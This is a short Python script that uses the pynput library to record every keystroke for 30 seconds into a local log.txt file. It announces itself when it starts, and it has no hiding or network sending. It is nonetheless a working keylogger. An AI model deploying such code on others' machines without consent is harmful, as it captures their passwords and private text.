from pynput.keyboard import Key, Listener
import time



def on_press(key):
    """Logs pressed key to a file, handling special keys."""
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'

    with open('log.txt', 'a') as f:
        f.write(key)

def main():
    """Listens for keyboard input for 30 seconds, then logs termination."""
    print("Keyboard listener started. Recording for 30 seconds...")

    try:
        # Start timer
        start_time = time.time()

        with Listener(on_press=on_press) as listener:
            listener.join(timeout=30)  

        # Log program termination
        with open('log.txt', 'a') as f:
            f.write("\n-- Keyboard listener stopped after 30 seconds. --\n")

    except KeyboardInterrupt:
        # Handle Ctrl+C gracefully
        print("\nKeyboard listener terminated by Ctrl+C.")

if __name__ == "__main__":
    main()
